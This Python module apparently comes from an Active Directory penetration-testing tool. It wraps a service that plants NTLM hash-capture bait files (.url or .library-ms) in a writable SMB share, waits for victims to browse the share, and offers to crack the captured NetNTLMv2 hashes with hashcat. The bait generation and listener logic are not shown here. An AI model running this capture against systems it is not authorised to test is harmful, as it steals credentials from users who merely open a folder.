"""Thin REPL caller for the modular NTLM share-drop capture service.

This module is intentionally a THIN wrapper around
:func:`adscan_internal.services.post_exploitation.ntlmv2_share_capture_service.run_share_capture`
— it parses operator arguments, resolves the target host / credentials from the
current domain context, surfaces and (when falling back to ``.library-ms``)
gets operator approval for the bait file type, prompts for an identifiable
filename, then delegates. All the actual logic (posture gate, MxAc verify,
listener, drop, wait, ledger-tracked cleanup) lives in the service so a future
graph-driven attack step can reuse it without touching this file.
"""

from __future__ import annotations

import shlex
from typing import Any

from adscan_internal import telemetry
from adscan_internal.models.domain import resolve_dc_fqdn, resolve_dc_ip
from adscan_internal.rich_output import (
    confirm_ask,
    mark_sensitive,
    print_error,
    print_info,
    print_info_debug,
    print_instruction,
    prompt_ask,
)
from adscan_internal.services.post_exploitation.ntlmv2_share_capture_service import (
    LIBRARY_MS_BAIT,
    URL_BAIT,
    default_bait_filename,
    run_share_capture,
)


def _parse_args(args: str) -> dict[str, Any]:
    """Parse ``capture_ntlm_share_drop`` arguments into a kwargs dict.

    Positional: ``<domain> <host> <share>``. Optional flags: ``--file-type``,
    ``--filename``, ``--wait``, ``--dir``.
    """
    tokens = shlex.split(str(args or ""))
    parsed: dict[str, Any] = {
        "domain": None,
        "host": None,
        "share": None,
        "file_type": URL_BAIT,
        "filename": None,
        "wait_seconds": 120,
        "directory_path": "",
    }
    positional: list[str] = []
    index = 0
    while index < len(tokens):
        token = tokens[index]
        if token in {"--file-type", "--filename", "--wait", "--dir"} and index + 1 < len(tokens):
            value = tokens[index + 1]
            index += 2
        elif "=" in token and token.startswith("--"):
            flag, value = token.split("=", 1)
            token = flag
            index += 1
        else:
            positional.append(token)
            index += 1
            continue

        if token == "--file-type":
            parsed["file_type"] = value.strip().lower()
        elif token == "--filename":
            parsed["filename"] = value.strip()
        elif token == "--wait":
            try:
                parsed["wait_seconds"] = max(int(value), 1)
            except ValueError:
                pass
        elif token == "--dir":
            parsed["directory_path"] = value.strip().strip("\\/")

    if len(positional) >= 1:
        parsed["domain"] = positional[0]
    if len(positional) >= 2:
        parsed["host"] = positional[1]
    if len(positional) >= 3:
        parsed["share"] = positional[2]
    return parsed


def _resolve_target_host(shell: Any, domain: str, explicit_host: str | None) -> str | None:
    """Resolve the share-serving host: explicit arg, else the domain DC FQDN/IP."""
    if explicit_host:
        return explicit_host.strip()
    domain_data = (
        shell.domains_data.get(domain)
        if isinstance(getattr(shell, "domains_data", None), dict)
        else None
    )
    if not isinstance(domain_data, dict):
        return None
    return resolve_dc_fqdn(domain_data, target_domain=domain) or resolve_dc_ip(domain_data)


def _resolve_creds(shell: Any, domain: str) -> dict[str, Any] | None:
    """Resolve write credentials from the current domain context."""
    domain_data = (
        shell.domains_data.get(domain)
        if isinstance(getattr(shell, "domains_data", None), dict)
        else None
    )
    if not isinstance(domain_data, dict):
        return None
    username = str(domain_data.get("username") or "").strip()
    password = str(domain_data.get("password") or "").strip()
    nt_hash = str(domain_data.get("nt_hash") or domain_data.get("hash") or "").strip()
    if not username or (not password and not nt_hash):
        return None
    return {
        "username": username,
        "password": password,
        "nt_hash": nt_hash,
        "auth_domain": domain,
    }


def run_capture_ntlm_share_drop(shell: Any, args: str) -> None:
    """Drop NTLM-capture bait into a writable share for the current domain.

    Usage:
        capture_ntlm_share_drop <domain> <host> <share> [--file-type=url|library-ms]
            [--filename=<name>] [--wait=<seconds>] [--dir=<subdir>]
    """
    parsed = _parse_args(args)
    domain = parsed["domain"]
    share = parsed["share"]
    if not domain or not share:
        print_error(
            "Usage: capture_ntlm_share_drop <domain> <host> <share> "
            "[--file-type=url|library-ms] [--filename=<name>] [--wait=<seconds>] [--dir=<subdir>]"
        )
        return

    from adscan_internal.services.listener_ip import (  # noqa: PLC0415
        resolve_untargeted_listener_ip,
    )

    listener_selection = resolve_untargeted_listener_ip(shell)
    if not listener_selection.resolved:
        print_error(
            listener_selection.failure_message(subject="whoever opens the bait file")
        )
        return
    listener_ip = str(listener_selection.ip)

    target_host = _resolve_target_host(shell, domain, parsed["host"])
    if not target_host:
        print_error(
            f"Could not resolve a target host for {mark_sensitive(domain, 'domain')}. "
            "Pass the host explicitly: capture_ntlm_share_drop <domain> <host> <share>"
        )
        return

    creds = _resolve_creds(shell, domain)
    if creds is None:
        print_error(
            "This capability requires authenticated domain credentials (username + "
            "password/hash) in the current domain context."
        )
        return

    # ── File-type surfacing + approval ───────────────────────────────────────
    file_type = parsed["file_type"]
    if file_type not in {URL_BAIT, LIBRARY_MS_BAIT}:
        print_info(
            f"[~] Unknown bait file type '{file_type}'; defaulting to the primary '.url' vector."
        )
        file_type = URL_BAIT

    if file_type == LIBRARY_MS_BAIT:
        # The operator explicitly selected (or fell back to) the .library-ms
        # vector — inform and require approval rather than dropping silently.
        print_info(
            "[~] Selected bait vector: .library-ms (XML iconReference). This is the FALLBACK "
            "vector; the primary '.url' vector triggers on a plain folder browse, while "
            ".library-ms triggers in the Libraries view."
        )
        if not confirm_ask("Proceed with the .library-ms fallback bait?", default=False):
            print_info("[~] NTLM share-drop capture cancelled by operator (file-type approval).")
            return

    # ── Identifiable-ADscan filename prompt with default ─────────────────────
    default_name = parsed["filename"] or default_bait_filename(file_type)
    filename = prompt_ask(
        "Bait filename (identifiable to ADscan; cleaned up after capture)",
        default=default_name,
    ).strip() or default_name

    print_info_debug(
        "[ntlm-share-capture] thin caller resolved: "
        f"domain={mark_sensitive(domain, 'domain')} "
        f"host={mark_sensitive(target_host, 'host')} "
        f"share={mark_sensitive(share, 'share')} "
        f"listener={mark_sensitive(listener_ip, 'ip')} "
        f"file_type={file_type} filename={mark_sensitive(filename, 'path')}"
    )

    try:
        result = run_share_capture(
            shell=shell,
            domain=domain,
            creds=creds,
            target_share=share,
            target_host=target_host,
            listener_ip=listener_ip,
            listener_bind_ip=listener_selection.bind_ip,
            file_type=file_type,
            filename=filename,
            directory_path=parsed["directory_path"],
            wait_seconds=parsed["wait_seconds"],
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error running NTLM share-drop capture.")
        from adscan_internal.rich_output import print_exception  # noqa: PLC0415

        print_exception(show_locals=False, exception=exc)
        return

    if result.status == "captured":
        print_info_debug(
            f"[ntlm-share-capture] captured credential, cleanup={result.cleanup_status}"
        )
        # Offer to crack the captured hash via the existing hashcat path
        # (reuses the same result-shaped helper the auto-offer uses).
        from adscan_internal.cli.smb import (  # noqa: PLC0415
            _offer_crack_for_captured_netntlm,
        )

        _offer_crack_for_captured_netntlm(shell, domain=domain, result=result)
    elif result.status in {"aborted", "skipped", "no_capture", "error"}:
        print_instruction(
            "No capture this run. Confirm the share is browsable by a target user and that the "
            "listener IP is routable from the target, then retry."
        )


__all__ = ["run_capture_ntlm_share_drop"]
